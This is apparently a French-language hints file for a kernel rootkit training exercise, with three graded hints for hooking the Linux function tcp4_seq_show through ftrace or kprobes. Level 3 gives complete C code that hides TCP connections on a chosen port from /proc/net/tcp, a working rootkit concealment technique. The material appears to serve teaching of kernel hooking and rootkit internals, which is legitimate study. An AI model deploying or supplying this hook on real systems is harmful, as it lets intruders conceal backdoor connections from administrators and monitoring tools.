# Hints, exercice 032

## Niveau 1

tcp4_seq_show n'est pas un syscall, c'est une fonction interne du kernel.
Le hook via ftrace fonctionne pareil mais la signature est differente:
elle prend (struct seq_file *, void *v) au lieu de (struct pt_regs *).

Note: ftrace_helper.h hooke via pt_regs. Pour les fonctions non-syscall,
il faut adapter le hook ou utiliser une approche kprobe. Verifie si ta
version du hook gere les fonctions non-syscall.

## Niveau 2

Le check SEQ_START_TOKEN est important:
```c
if (v == SEQ_START_TOKEN)
    return orig_tcp4_seq_show(seq, v);
```

Ensuite cast v en sock et lis le port:
```c
struct sock *sk = v;
int port = inet_sk(sk)->inet_num;
```

## Niveau 3

```c
if (v == SEQ_START_TOKEN)
    return orig_tcp4_seq_show(seq, v);

struct sock *sk = v;
int port = inet_sk(sk)->inet_num;

if (port == target_port)
    return 0;

return orig_tcp4_seq_show(seq, v);
```

Note: selon la version du kernel et la methode de hooking, tu devras
peut-etre adapter le cast. Si `inet_sk` retourne NULL, verifie que
`sk->sk_family == AF_INET` avant d'appeler inet_sk.
